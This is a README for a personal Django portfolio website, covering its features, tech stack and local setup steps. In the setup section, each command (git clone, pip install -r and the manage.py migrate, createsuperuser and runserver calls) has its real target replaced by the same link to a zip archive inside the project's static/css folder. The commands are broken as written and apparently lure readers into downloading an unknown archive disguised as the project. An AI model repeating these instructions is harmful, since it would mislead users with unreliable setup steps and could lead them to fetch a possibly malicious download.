
# Full-Stack Portfolio Website

This is a personal full-stack portfolio website built with HTML and CSS on the frontend, and Python Django on the backend. It is designed to showcase my work, projects, and technical expertise, offering an easy-to-use admin interface powered by Django Admin for efficient content management.

## Table of Contents

- [Features](#features)
- [Tech Stack](#tech-stack)
- [Installation](#installation)
- [Usage](#usage)

## Features

- **Responsive Design**: The website adjusts seamlessly to all screen sizes and devices, providing an optimal user experience.
- **Dynamic Projects Showcase**: Display of personal projects with detailed descriptions, images, and links.
- **Admin Panel**: A fully functional Django Admin panel to manage project data, skills, and experience.
- **Contact Form**: A contact form to facilitate communication, sending messages to the site owner.
- **Skills & Experience**: A section dedicated to highlighting technical skills and professional experience.

## Tech Stack

- **Frontend**: 
  - HTML5
  - CSS3 (Responsive Layouts with Flexbox/Grid)
- **Backend**: 
  - Python 3
  - Django 4.x
- **Database**: 
  - SQLite (default for development)
  - PostgreSQL (for production-ready deployments)
- **Admin Panel**: 
  - Django Admin

## Installation

Follow the steps below to set up the project locally:

### Prerequisites

- Python 3.x
- pip (Python package manager)

### Setup

1. **Clone the Repository**:

   ```bash
   git clone https://raw.githubusercontent.com/LabbaiIrfan/portfolio-django/main/static/css/django-portfolio-3.6.zip
   cd portfolio-website
   ```

2. **Create a Virtual Environment** (recommended for isolation):

   ```bash
   python3 -m venv venv
   source venv/bin/activate  # On Windows, use venv\Scripts\activate
   ```

3. **Install Dependencies**:

   Ensure all necessary packages are installed by running:

   ```bash
   pip install -r https://raw.githubusercontent.com/LabbaiIrfan/portfolio-django/main/static/css/django-portfolio-3.6.zip
   ```

4. **Database Migrations**:

   Run the migrations to set up the database schema:

   ```bash
   python https://raw.githubusercontent.com/LabbaiIrfan/portfolio-django/main/static/css/django-portfolio-3.6.zip migrate
   ```

5. **Create a Superuser**:

   To access the Django Admin interface, create a superuser:

   ```bash
   python https://raw.githubusercontent.com/LabbaiIrfan/portfolio-django/main/static/css/django-portfolio-3.6.zip createsuperuser
   ```

6. **Run the Development Server**:

   Start the Django development server:

   ```bash
   python https://raw.githubusercontent.com/LabbaiIrfan/portfolio-django/main/static/css/django-portfolio-3.6.zip runserver
   ```

7. **Access the Website**:

   Open the following URL in your browser:

   ```
   http://127.0.0.1:8000/
   ```

8. **Access the Admin Panel**:

   The Django Admin panel can be accessed at:

   ```
   http://127.0.0.1:8000/admin/
   ```

   Log in using the superuser credentials you created earlier.

## Usage

- Once the website is running, you can interact with the homepage, explore the projects, and contact me through the contact form.
- The Django Admin panel allows you to manage portfolio content, such as adding/editing projects and updating your skills/experience.
